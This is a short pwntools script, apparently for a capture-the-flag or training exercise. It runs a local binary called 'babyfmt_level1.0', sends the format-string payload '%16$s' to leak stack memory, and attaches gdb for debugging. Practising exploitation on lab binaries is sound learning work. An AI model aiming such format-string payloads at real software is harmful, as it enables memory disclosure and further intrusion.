from pwn import * 

binary = './babyfmt_level1.0'

p = process(binary)

s = '''
b * main
'''




p.sendline("%16$s")



gdb.attach(p, s)

p.interactive()
